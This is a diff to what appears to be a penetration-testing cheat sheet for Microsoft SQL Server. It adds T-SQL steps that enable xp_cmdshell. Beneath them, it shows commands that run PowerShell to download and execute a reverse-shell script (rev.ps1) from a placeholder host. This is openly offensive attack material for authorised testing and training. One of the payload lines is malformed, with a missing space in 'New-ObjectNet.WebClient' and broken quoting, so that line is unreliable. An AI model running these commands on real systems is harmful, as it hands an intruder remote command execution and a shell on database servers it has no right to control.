@@ -4091,6 +4091,23 @@ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth
 ```
 
+Enable xp_cmdshell
+
+```c
+-- To allow advanced options to be changed.
+EXEC sp_configure 'show advanced options', 1
+GO
+-- To update the currently configured value for advanced options.
+RECONFIGURE
+GO
+-- To enable the feature.
+EXEC sp_configure 'xp_cmdshell', 1
+GO
+-- To update the currently configured value for this feature.
+RECONFIGURE
+GO
+```
+
 ```c
 xp_cmdshell "powershell "IEX (New-ObjectNet.WebClient).DownloadString(\"http://IP:PORT/rev.ps1\");"
 EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://IP:PORT/rev.ps1") | powershell -noprofile'
